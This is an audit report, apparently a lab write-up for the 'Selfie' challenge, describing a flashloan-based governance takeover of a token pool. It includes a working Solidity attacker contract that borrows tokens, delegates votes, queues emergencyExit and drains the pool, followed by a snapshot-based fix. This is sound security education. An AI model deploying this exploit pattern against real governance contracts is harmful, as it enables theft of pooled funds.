---
title: Selfie Audit Report
author: Jack
date: January 10, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---


Prepared by: [Jack](https://github.com/Jack-OuCJ)

# Table of Contents
- [Severity Classification](#severity-classification)
- [Summary](#summary)
- [Findings](#findings)
  - [High](#high)

# Severity Classification

| Severity         | Description |
| ---------------- | ----------- |
| ![high]          | A **directly** exploitable security vulnerability that leads to stolen/lost/locked/compromised assets or catastrophic denial of service. |
| ![medium]        | Assets not at direct risk, but the function of the protocol or its availability could be impacted. |
| ![low]           | A violation of common best practices or incorrect usage of primitives, which may not currently have a major impact on security. |
| ![informational] | Non-critical comments, recommendations or potential optimizations, not relevant to security. |

# Summary

| Severity         | Number of issues found |
| ---------------- | ---------------------- |
| ![high]          | 1                      |
| ![medium]        | 0                      |
| ![low]           | 0                      |
| ![informational] | 0                      |
| Total            | 1                      |

# Findings

## High

### [H-1] Flashloan enables temporary governance quorum acquisition, allowing attacker to queue and execute `emergencyExit` without owning any tokens

**Description:** `SimpleGovernance::queueAction()` checks voting power at the moment of the call using `getVotes()`, which reflects the current delegated balance. There is no snapshot mechanism — the check does not look at a historic block to prevent flashloan-based vote acquisition:

```solidity
function queueAction(address target, uint128 value, bytes calldata data)
    external
    returns (uint256 actionId)
{
    // ⚠️ Checks live vote balance with no snapshot protection
    if (!_hasEnoughVotes(msg.sender)) {
        revert NotEnoughVotes(msg.sender);
    }
    ...
}

function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}
```

`SelfiePool` offers a free flashloan for the DVT governance token:

```solidity
function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
    external
    nonReentrant
    returns (bool)
{
    ...
    token.transfer(address(_receiver), _amount);
    ...
}
```

An attacker can borrow all pool tokens via flashloan, delegate them to themselves in the `onFlashLoan()` callback, and then call `queueAction(pool.emergencyExit(recovery))` while holding >50% of the supply. After the 2-day governance delay, anyone can execute the action, draining all pool tokens.

**Impact:** An attacker with zero initial capital can queue a governance action that calls `SelfiePool::emergencyExit()` to transfer all 1,500,000 DVT tokens in the pool to an arbitrary address. The 2-day delay is the only obstacle and does not prevent the attack — it only adds a waiting period.

**Proof of Concept:**

```solidity
contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool pool;
    SimpleGovernance governance;
    address recovery;
    uint256 public actionId;

    function attack() external {
        pool.flashLoan(this, address(pool.token()), pool.maxFlashLoan(address(pool.token())), "");
    }

    function onFlashLoan(address, address token, uint256 amount, uint256, bytes calldata)
        external returns (bytes32)
    {
        // 1. Delegate borrowed tokens to self → acquire voting power
        DamnValuableVotes(token).delegate(address(this));

        // 2. Queue emergencyExit with newly acquired >50% votes
        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeCall(pool.emergencyExit, (recovery))
        );

        // 3. Approve repayment and return tokens
        DamnValuableVotes(token).approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

// After 2 days:
governance.executeAction(actionId);
// All pool tokens sent to recovery
```

**Recommended Mitigation:**

Use ERC20Votes' built-in snapshot mechanism (`getPastVotes`) at a fixed past block to determine voting power, preventing flashloan-based vote acquisition:

```diff
function _hasEnoughVotes(address who) private view returns (bool) {
-   uint256 balance = _votingToken.getVotes(who);
+   uint256 balance = _votingToken.getPastVotes(who, block.number - 1);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}
```

This ensures votes must have been held before the current block, making flashloan-based governance attacks impossible.

[high]: https://img.shields.io/badge/-High-red "High"
[medium]: https://img.shields.io/badge/-Medium-orange "Medium"
[low]: https://img.shields.io/badge/-Low-yellow "Low"
[informational]: https://img.shields.io/badge/-Informational-blue "Informational"
